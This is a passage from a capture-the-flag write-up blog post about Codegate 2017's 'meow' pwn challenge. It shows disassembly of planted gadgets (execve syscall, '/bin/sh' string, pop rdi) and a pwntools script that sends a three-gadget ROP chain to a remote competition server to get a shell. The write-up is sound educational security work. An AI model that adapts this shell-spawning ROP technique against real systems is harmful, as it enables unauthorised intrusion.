class="hljs-keyword">ret</span><br></pre></td></tr></table></figure>
<p>It reads <code>0x18</code> bytes to the return address just before returning, which means we have a three-gadget ROP. Since this is a PIE binary, and we don’t have any information leak, and the ROP chain is extremely short, it seems that we can basically do nothing. Nevertheless, the author of the program has deliberately put the exact three gadgets that we need in the second part of the data. Because the second part of the data is located in a mmaped memory of which address is known, we can easily use them to launch the shell.</p>
<figure class="highlight x86asm"><figcaption><span>Second part of decrypted code</span></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br></pre></td><td class="code"><pre><span class="hljs-keyword">push</span>   <span class="hljs-built_in">rbp</span><br><span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">rsp</span><br><span class="hljs-keyword">sub</span>    <span class="hljs-built_in">rsp</span>, <span class="hljs-number">0x10</span><br><span class="hljs-keyword">mov</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span> - <span class="hljs-number">8</span>], <span class="hljs-built_in">rdi</span><br><span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span> - <span class="hljs-number">8</span>]<br><span class="hljs-keyword">mov</span>    <span class="hljs-built_in">edx</span>, <span class="hljs-number">0</span><br><span class="hljs-keyword">mov</span>    <span class="hljs-built_in">esi</span>, <span class="hljs-number">0</span><br><span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>, <span class="hljs-number">0x3b</span><br><span class="hljs-keyword">syscall</span><br><span class="hljs-keyword">nop</span><br><span class="hljs-keyword">leave</span><br><span class="hljs-keyword">ret</span><br><span class="hljs-meta">.byte</span> <span class="hljs-number">0x00</span><br><span class="hljs-meta">.byte</span> <span class="hljs-number">0x00</span><br><span class="hljs-meta">.ascii</span> <span class="hljs-string">'/bin/sh'</span><br><span class="hljs-meta">.byte</span> <span class="hljs-number">0x00</span><br><span class="hljs-meta">.byte</span> <span class="hljs-number">0x00</span><br><span class="hljs-meta">.byte</span> <span class="hljs-number">0x00</span><br><span class="hljs-meta">.byte</span> <span class="hljs-number">0x00</span><br><span class="hljs-meta">.byte</span> <span class="hljs-number">0x00</span><br><span class="hljs-meta">.byte</span> <span class="hljs-number">0x00</span><br><span class="hljs-keyword">pop</span>    <span class="hljs-built_in">rdi</span><br><span class="hljs-keyword">ret</span><br></pre></td></tr></table></figure>
<p>The exploit script is as follows.</p>
<figure class="highlight python"><figcaption><span>meow_exp.py</span><a href="/2017/02/20/meow/meow_exp.py">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br></pre></td><td class="code"><pre><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><br>context.terminal = [<span class="hljs-string">'tmux'</span>, <span class="hljs-string">'splitw'</span>, <span class="hljs-string">'-h'</span>]<br>context.arch = <span class="hljs-string">'x86_64'</span><br><br>pop_rdi = <span class="hljs-number">0x14036</span><br>bin_sh = <span class="hljs-number">0x14029</span><br>execve = <span class="hljs-number">0x14000</span><br><br><span class="hljs-comment">#  r = process('./meow')</span><br><span class="hljs-comment">#  gdb.attach(r, '''</span><br><span class="hljs-comment">#  ''')</span><br>r = remote(<span class="hljs-string">'110.10.212.139'</span>, <span class="hljs-number">50410</span>)<br><br>r.sendline(<span class="hljs-string">'$W337k!++y'</span>)<br><span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'= '</span>)<br>r.sendline(<span class="hljs-string">'3'</span>)<br><span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'&gt;&gt;&gt;'</span>)<br>r.send(flat(pop_rdi, bin_sh, execve))<br><br>r.interactive()<br></pre></td></tr></table></figure>
<blockquote>
<p>Flag: <code>flag{what a lovely kitty!}</code></p>
</blockquote>
</div><!-- comment system--><div class="container"><hr><div id="disqus_thread"></div><script type="text/javascript">
var disqus_shortname = 'poning';
var disqus_identifier = '2017/02/20/meow/';
var disqus_title = 'Codegate prequals 2017: meow (pwn 365)';
var disqus_url = 'https://poning.me/2017/02/20/meow/';
(function() {
   var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
   dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
   (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">Blog comments powered by <span class="logo-disqus">Disqus</span></a></div></article><footer id="footer"><div class="container"><div class="bar"><div class="social"><a href="mailto:i@poning.me" target="_blank"><i class="fa fa-envelope-o"></i></a><a href="https://github.com/Isaac0616" target="_blank"><i class="fa fa-github"></i></a><a href="/atom.xml" target="_blank"><i class="fa fa-rss"></i></a></div><div class="footer">© 2017 <a href="/" rel="nofollow">Isaac Tseng</a>. Powered by <a rel="nofollow" target="_blank" href="https://hexo.io">Hexo</a>. Theme <a target="_blank" href="https://github.com/lotabout/very-simple">very-simple</a>.</div></div></div></footer><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.css"><script src="//cdn.bootcss.com/jquery/2.0.3/jquery.min.js"></script><script src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script><script>$(document).ready(function() {
    $(".fancybox").fancybox();
});
</script></body><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=
function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;
e=o.createElement(i);r=o.getElementsByTagName(i)[0];
e.src='//www.google-analytics.com/analytics.js';
r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));
ga('create','UA-86477289-1');ga('send','pageview');</script></html>